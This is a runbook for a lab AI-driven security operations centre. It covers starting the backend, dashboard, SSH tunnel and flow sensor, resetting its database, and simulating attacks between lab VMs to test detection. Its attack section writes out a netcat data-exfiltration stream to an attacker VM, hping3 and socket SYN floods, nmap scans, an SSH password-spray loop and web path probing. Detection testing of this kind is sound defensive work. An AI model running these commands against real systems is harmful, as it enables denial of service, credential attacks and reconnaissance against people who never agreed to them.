# Multi-Agent AI SOC: Operational Runbook & Attack Simulation Guide

This document lists all exact commands required to:
1. **Run the Complete System** (FastAPI backend, React dashboard, reverse SSH tunnel, victim flow sensor, and sensor orchestrator)
2. **Empty and Reset the Database** (`soc.db`)
3. **Simulate Different Types of Real-Time Attacks** (Exfiltration, SYN Floods, Port Scans, SSH Brute Force, Sudo Privilege Escalation, and Dataset Replay)

---

## 1. Commands Needed to Run the System

The SOC architecture operates with a local Windows workstation (hosting ML models, SQLite storage, FastAPI backend, and React UI) paired with a remote Ubuntu Victim VM (`45.74.156.54`, private IP `10.0.0.12`) communicating across an encrypted reverse SSH tunnel (`127.0.0.1:18000` -> Windows `8000`).

### Component 1: Start the FastAPI Backend (Windows PowerShell)
Runs on `http://127.0.0.1:8000`:
```powershell
cd E:\multi-agent-soc
python -m uvicorn dashboard_api:app --host 127.0.0.1 --port 8000 --reload
```
*Health verification:* Open `http://127.0.0.1:8000/api/health` in your browser.

---

### Component 2: Start the React Dashboard Frontend (Windows PowerShell)
Runs on `http://localhost:5173`:
```powershell
cd E:\multi-agent-soc\frontend
npm run dev
```
*Dashboard URL:* Open `http://localhost:5173/` in your browser.

---

### Component 3: Establish the Reverse SSH Tunnel (Windows PowerShell)
Binds victim VM port `18000` to local Windows port `8000` so the victim VM can securely post telemetry without exposing Windows ports to the internet:
```powershell
ssh -N -R 18000:127.0.0.1:8000 -i "$env:USERPROFILE\.ssh\soc_lab" -o BatchMode=yes -o StrictHostKeyChecking=no -o ServerAliveInterval=10 -o ServerAliveCountMax=6 ubuntu@45.74.156.54
```

*Test the tunnel from the victim VM:*
```bash
ssh -i "$env:USERPROFILE\.ssh\soc_lab" -o StrictHostKeyChecking=no ubuntu@45.74.156.54 "curl -s http://127.0.0.1:18000/api/health"
```

---

### Component 4: Victim Autonomous Network Flow Sensor Daemon (Ubuntu Victim VM)
The victim VM runs an autonomous Python daemon (`/home/ubuntu/soc_flow_daemon.py`) as a persistent systemd service (`soc-flow-sensor.service`). It sniffs `eth0`, extracts all 78 canonical CICFlowMeter bidirectional features, and posts them across the tunnel.

**Check daemon status:**
```bash
ssh -i "$env:USERPROFILE\.ssh\soc_lab" -o StrictHostKeyChecking=no ubuntu@45.74.156.54 "sudo systemctl status soc-flow-sensor.service --no-pager"
```

**Restart or start daemon:**
```bash
ssh -i "$env:USERPROFILE\.ssh\soc_lab" -o StrictHostKeyChecking=no ubuntu@45.74.156.54 "sudo systemctl restart soc-flow-sensor.service"
```

**View live flow ingestion logs:**
```bash
ssh -i "$env:USERPROFILE\.ssh\soc_lab" -o StrictHostKeyChecking=no ubuntu@45.74.156.54 "journalctl -u soc-flow-sensor.service -f"
```

**Run manually in the foreground (for debugging):**
```bash
ssh -i "$env:USERPROFILE\.ssh\soc_lab" -o StrictHostKeyChecking=no ubuntu@45.74.156.54 "sudo python3 /home/ubuntu/soc_flow_daemon.py --interface eth0 --ingest-url http://127.0.0.1:18000/api/ingest/flow"
```

---

### Component 5: Host System Log Collector (Windows PowerShell)
Tails `/var/log/auth.log` and system logs from the victim VM over SSH and submits them to `POST /api/ingest/logs`:
```powershell
cd E:\multi-agent-soc
python -m agents.vm_sensor --mode vm_logs --interval 3.0
```
*Note:* You can also run `--mode vm_all` to poll both host logs and flow files.

---

## 2. Commands Needed to Empty and Reset the Database

To reset the database cleanly without schema corruption or file lock errors, choose either of the following two methods:

### Method A: In-Place Table Truncation (Recommended - Fast & Safe)
Wipes all events, alerts, assessments, investigations, playbooks, LLM reasoning, and system logs while keeping table schemas intact and resetting auto-increment counters:

```powershell
cd E:\multi-agent-soc
python -c "
import sqlite3
conn = sqlite3.connect('data/soc.db')
c = conn.cursor()
tables = [r[0] for r in c.execute('SELECT name FROM sqlite_master WHERE type=\"table\" AND name != \"sqlite_sequence\"').fetchall()]
for t in tables:
    c.execute(f'DELETE FROM {t};')
c.execute('DELETE FROM sqlite_sequence;')
conn.commit()
conn.close()
print('>>> SUCCESS: All tables truncated and counters reset in data/soc.db')
"
```

---

### Method B: Complete File Recreation
Deletes `data/soc.db` and runs `AlertStore.init_schema()` to recreate a brand new SQLite database:

```powershell
cd E:\multi-agent-soc
Remove-Item "data\soc.db" -Force -ErrorAction Ignore
Remove-Item "data\soc.db-wal" -Force -ErrorAction Ignore
Remove-Item "data\soc.db-shm" -Force -ErrorAction Ignore
python -c "
from storage.db import AlertStore
store = AlertStore()
store.init_schema()
store.close()
print('>>> SUCCESS: Fresh soc.db database created with all schemas and indexes!')
"
```

---

### Verify Database is Empty
Check that all row counts are zero:
```powershell
python -c "
import sqlite3
conn = sqlite3.connect('data/soc.db')
c = conn.cursor()
tables = [r[0] for r in c.execute('SELECT name FROM sqlite_master WHERE type=\"table\" AND name != \"sqlite_sequence\"').fetchall()]
print('Database Row Counts:')
for t in tables:
    print(f'  {t}: {c.execute(f\"SELECT count(*) FROM {t}\").fetchone()[0]} rows')
"
```

---

## 3. Commands Needed to Simulate Different Types of Attacks

All attack commands can be executed between the Victim VM (`10.0.0.12` / `45.74.156.54`) and the Attacker / Twin VM (`10.0.0.13` / `45.74.156.53`).

---

### Attack 1: Massive Data Exfiltration (Port 9001 / High-Bandwidth Socket)
*Scenario:* An attacker exfiltrates gigabytes/megabytes of sensitive data from the victim machine over an unencrypted high-port TCP stream.

**Step 1: Start the listening receiver on the Attacker VM (`10.0.0.13`):**
```bash
ssh -i "$env:USERPROFILE\.ssh\soc_lab" -o StrictHostKeyChecking=no ubuntu@45.74.156.53 "nc -l 9001 > /dev/null"
```

**Step 2: Stream 10 MB of exfiltrated data from the Victim VM (`10.0.0.12`):**
```bash
ssh -i "$env:USERPROFILE\.ssh\soc_lab" -o StrictHostKeyChecking=no ubuntu@45.74.156.54 "dd if=/dev/urandom bs=1M count=10 2>/dev/null | nc -N 10.0.0.13 9001"
```

*Expected SOC Detection:*
* **Anomaly Detection Agent:** Flagged as `Anomalous`, `Severity: HIGH`, `Status: SUSPICIOUS` (extreme burst throughput and volume).
* **Threat Assessment:** `Suspicious Anomaly (MEDIUM severity)`.
* **Stage 10 Investigation & Gemini Reasoning:** Categorized as **Exfiltration** mapped to MITRE ATT&CK **T1041** / **T1071**.

---

### Attack 2: TCP SYN Flood / DoS Burst (Port 80 / Web Service)
*Scenario:* Attacker floods the victim with high-frequency TCP SYN packets without completing the 3-way handshake.

**Run from the Attacker VM (`10.0.0.13`) targeting Victim (`10.0.0.12`):**
```bash
ssh -i "$env:USERPROFILE\.ssh\soc_lab" -o StrictHostKeyChecking=no ubuntu@45.74.156.53 "sudo hping3 -S -p 80 -c 1000 -i u1000 10.0.0.12"
```

*Alternative using Python raw sockets (no root required):*
```bash
ssh -i "$env:USERPROFILE\.ssh\soc_lab" -o StrictHostKeyChecking=no ubuntu@45.74.156.53 "python3 -c '
import socket, time
for i in range(200):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(False)
        s.connect_ex((\"10.0.0.12\", 80))
        s.close()
    except Exception: pass
print(\"Sent 200 SYN burst packets\")
'"
```

*Expected SOC Detection:*
* **Network Detection / Anomaly:** High `SYN Flag Cnt`, zero ACK completion, rapid flow duration, classified as `DoS / Network Attack`.

---

### Attack 3: Port Scan / Host Reconnaissance (Nmap Discovery)
*Scenario:* An adversary conducts automated network reconnaissance to identify open ports and running services.

**Run fast SYN stealth scan from Attacker (`10.0.0.13`) against Victim (`10.0.0.12`):**
```bash
ssh -i "$env:USERPROFILE\.ssh\soc_lab" -o StrictHostKeyChecking=no ubuntu@45.74.156.53 "nmap -sS -p 21,22,23,25,80,443,3306,3389,8080,9001 -T4 10.0.0.12"
```

**Or full port sweep from Victim (`10.0.0.12`) scanning Attacker (`10.0.0.13`):**
```bash
ssh -i "$env:USERPROFILE\.ssh\soc_lab" -o StrictHostKeyChecking=no ubuntu@45.74.156.54 "nmap -F 10.0.0.13"
```

*Expected SOC Detection:*
* Multiple sequential flows to distinct destination ports with short durations and SYN/RST flags. Classified as **PortScan / Reconnaissance**.

---

### Attack 4: SSH Brute Force / Credential Stuffing
*Scenario:* An automated dictionary attack attempting multiple unauthorized logins against SSH.

**Run password spray from Attacker (`10.0.0.13`) against Victim (`10.0.0.12`):**
```bash
ssh -i "$env:USERPROFILE\.ssh\soc_lab" -o StrictHostKeyChecking=no ubuntu@45.74.156.53 "
for user in admin root test user guest; do
  for pass in 123456 password admin toor; do
    sshpass -p \"\$pass\" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 \"\$user\"@10.0.0.12 \"exit\" 2>/dev/null
  done
done
echo 'SSH password spray complete!'
"
```

*Expected SOC Detection:*
* **Victim Telemetry Tab:** Repeated `AUTH_FAILURE` logs from `sshd` with bad usernames/passwords.
* **Alert Correlation & Gemini AI:** Correlates multiple auth failures into a high-confidence **Brute Force (MITRE T1110)** incident report.

---

### Attack 5: Unauthorized Sudo Privilege Escalation
*Scenario:* A compromised lower-privileged user attempts to run commands as root using failed `sudo` attempts.

**Run inside the Victim VM (`10.0.0.12`):**
```bash
ssh -i "$env:USERPROFILE\.ssh\soc_lab" -o StrictHostKeyChecking=no ubuntu@45.74.156.54 "
# Attempt invalid sudo passwords to trigger audit logs
for i in {1..5}; do
  echo 'incorrect_root_pass' | sudo -S ls /root 2>/dev/null
done
echo 'Privilege escalation attempts logged!'
"
```

*Expected SOC Detection:*
* Appears under **Victim Telemetry & Sensor** with `log_type: AUTH_FAILURE` and `service: sudo`.

---

### Attack 6: HTTP Web Application Directory Fuzzing / Probing
*Scenario:* Attacker sends abnormal HTTP requests to sensitive administrative endpoints.

**Run web probe against Victim (`10.0.0.12:80`):**
```bash
ssh -i "$env:USERPROFILE\.ssh\soc_lab" -o StrictHostKeyChecking=no ubuntu@45.74.156.53 "
endpoints=('/admin' '/wp-login.php' '/.env' '/phpmyadmin' '/config.json' '/shell.php' '/actuator/health')
for ep in \"\${endpoints[@]}\"; do
  curl -s -m 1 \"http://10.0.0.12:80\$ep\" > /dev/null
done
echo 'Web probe finished!'
"
```

---

### Attack 7: Dataset Stream Replay Simulator (Offline Ground-Truth Attacks)
*Scenario:* Replays ground-truth CIC-IDS2017 flow data (Infiltration, PortScan, DDoS, and Benign) through the unified multi-agent pipeline.

**Run 50 events at 2 flows/second:**
```powershell
cd E:\multi-agent-soc
python -m kafka.producer --interval 0.5 --limit 50
```

**Run continuous simulation:**
```powershell
python -m kafka.producer --interval 1.0
```

---

## 4. Dashboard Verification Cheatsheet

| Dashboard Tab | What It Displays | How to Inspect After Attack |
| :--- | :--- | :--- |
| **Live Event Stream** | All ingested network flows | Filter by `Severity: HIGH` or search `9001`. Click any row to open the **Event Telemetry Inspector** drawer. |
| **Unified Threat Assessments** | Deterministic threat policies | See categorized verdicts: `Confirmed Attack`, `Suspected Attack`, or `Suspicious Anomaly`. |
| **Threat Investigations** | Stage 10 Multi-Agent deep dives | Inspect evidence synthesis, conflicting signals, and causality analysis. |
| **Alerts & Incidents** | Correlated security alerts | View Random Forest and Isolation Forest confidence and anomaly scores. |
| **Response Playbooks & Gemini AI** | Containment actions & LLM analysis | Inspect Gemini 3.8 Flash incident root cause, confidence assessment, and MITRE ATT&CK techniques. |
| **Victim Telemetry & Sensor** | Real-time host OS system logs | Inspect SSH auth failures, sudo violations, and host security daemon logs. |
